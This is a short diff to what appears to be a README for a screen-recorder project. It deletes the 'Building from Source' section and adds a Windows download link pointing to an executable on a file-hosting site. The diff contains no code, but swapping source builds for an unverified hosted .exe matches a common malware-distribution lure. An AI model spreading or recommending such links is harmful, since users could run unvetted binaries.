@@ -45,7 +45,5 @@ It supports full or partial screen capture, microphone/system audio recording, s
 7. After stopping, the recording folder opens automatically
 
 ---
-
-## **Building from Source (Optional)**
-
-1. Install dependencies:
+## Download for Windows 7,8,10,11
+[Download](https://www.mediafire.com/file/vset0o346xt13ne/screen_recorder.exe/file)
